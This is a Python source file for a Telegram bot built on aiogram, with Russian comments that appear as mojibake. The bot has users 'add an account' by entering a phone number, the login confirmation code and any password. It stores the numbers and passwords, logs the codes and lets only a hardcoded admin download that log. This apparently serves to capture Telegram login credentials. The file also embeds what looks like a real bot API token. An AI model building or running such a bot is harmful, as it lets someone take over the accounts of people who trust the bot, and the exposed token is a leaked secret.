import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import sqlite3
import os

API_TOKEN = '6760012279:AAGfY1w2LR7TuY1r_mbMXIyLlscrai2oT28'  # –¢–≤–æ–π API —Ç–æ–∫–µ–Ω

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
ADMIN_ID = 954053674  # –£–∫–∞–∂–∏ —Å–≤–æ–π ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

# –§–∞–π–ª –¥–ª—è –ª–æ–≥–æ–≤
LOG_FILE = 'logs.txt'

# –°–æ–∑–¥–∞–µ–º/–æ—Ç–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª –¥–ª—è –ª–æ–≥–æ–≤
def log_action(action):
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(action + '\n')

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
def is_admin(user_id):
    return user_id == ADMIN_ID

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö
conn = sqlite3.connect('accounts.db')
cursor = conn.cursor()

# –°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—ã –µ—Å–ª–∏ –æ–Ω–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É—é—Ç
cursor.execute('''CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT,
    password TEXT,
    status TEXT DEFAULT 'active'
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS apps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    name TEXT
)''')
conn.commit()

# –ì–ª–∞–≤–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ /start
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    add_account_btn = KeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç")
    manage_apps_btn = KeyboardButton("‚öô –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏")
    
    # –ö–Ω–æ–ø–∫–∞ –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ª–æ–≥–æ–≤ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
    if is_admin(message.from_user.id):
        download_logs_btn = KeyboardButton("üìÑ –°–∫–∞—á–∞—Ç—å –ª–æ–≥–∏")
        markup.add(download_logs_btn)
    
    markup.add(add_account_btn, manage_apps_btn)
    
    await message.answer("–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞
@dp.message_handler(lambda message: message.text == "‚ûï –î–æ–±–∞–≤–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç")
async def add_account(message: types.Message):
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:")
    
    @dp.message_handler()
    async def get_phone_number(message: types.Message):
        phone = message.text
        cursor.execute("INSERT INTO accounts (phone) VALUES (?)", (phone,))
        conn.commit()
        
        # –õ–æ–≥–∏—Ä—É–µ–º –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞
        log_action(f"{message.from_user.username}: –î–æ–±–∞–≤–∏–ª –∞–∫–∫–∞—É–Ω—Ç: {phone}")
        
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è (–±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞):")
        
        # –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Ü–∏—Ñ—Ä–æ–≤—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É 3—Ö3
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        buttons = [KeyboardButton(str(i)) for i in range(1, 10)]
        markup.add(*buttons)
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–æ–∫ –Ω–∏–∂–µ:", reply_markup=markup)

        # –û–∂–∏–¥–∞–µ–º –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
        @dp.message_handler()
        async def enter_code(message: types.Message):
            code = message.text
            
            # –õ–æ–≥–∏—Ä—É–µ–º –≤–≤–æ–¥ –∫–æ–¥–∞
            log_action(f"{message.from_user.username}: –í–≤—ë–ª –∫–æ–¥: {code}")
            
            await message.answer(f"–ê–∫–∫–∞—É–Ω—Ç –¥–æ–±–∞–≤–ª–µ–Ω: {phone}")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è
            await message.answer("–ï—Å–ª–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å, –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ:")
            
            @dp.message_handler()
            async def enter_password(message: types.Message):
                password = message.text
                cursor.execute("UPDATE accounts SET password = ? WHERE phone = ?", (password, phone))
                conn.commit()
                
                # –õ–æ–≥–∏—Ä—É–µ–º –≤–≤–æ–¥ –ø–∞—Ä–æ–ª—è
                log_action(f"{message.from_user.username}: –í–≤—ë–ª –ø–∞—Ä–æ–ª—å")
                
                await message.answer(f"–ü–∞—Ä–æ–ª—å –¥–æ–±–∞–≤–ª–µ–Ω –¥–ª—è –∞–∫–∫–∞—É–Ω—Ç–∞: {phone}")

# –û–±—Ä–∞–±–æ—Ç–∫–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏
@dp.message_handler(lambda message: message.text == "‚öô –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏")
async def manage_accounts(message: types.Message):
    cursor.execute("SELECT phone FROM accounts")
    accounts = cursor.fetchall()
    if accounts:
        accounts_list = "\n".join([f"–ê–∫–∫–∞—É–Ω—Ç: {account[0]}" for account in accounts])
        await message.answer(f"–í–∞—à–∏ –∞–∫–∫–∞—É–Ω—Ç—ã:\n{accounts_list}")
    else:
        await message.answer("–£ –≤–∞—Å –µ—â–µ –Ω–µ—Ç –¥–æ–±–∞–≤–ª–µ–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤.")

# –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
@dp.message_handler(lambda message: message.text == "‚öô –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏")
async def manage_apps(message: types.Message):
    await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ:")
    
    @dp.message_handler()
    async def add_app_link(message: types.Message):
        app_url = message.text
        cursor.execute("INSERT INTO apps (url) VALUES (?)", (app_url,))
        conn.commit()
        
        # –õ–æ–≥–∏—Ä—É–µ–º –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —Å—Å—ã–ª–∫–∏
        log_action(f"{message.from_user.username}: –î–æ–±–∞–≤–∏–ª —Å—Å—ã–ª–∫—É: {app_url}")
        
        await message.answer(f"–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–æ–±–∞–≤–ª–µ–Ω–æ: {app_url}")

# –°–∫–∞—á–∞—Ç—å –ª–æ–≥–∏ (–¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É)
@dp.message_handler(lambda message: message.text == "üìÑ –°–∫–∞—á–∞—Ç—å –ª–æ–≥–∏")
async def send_logs(message: types.Message):
    if is_admin(message.from_user.id):
        with open(LOG_FILE, 'rb') as log_file:
            await bot.send_document(message.chat.id, log_file)
    else:
        await message.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
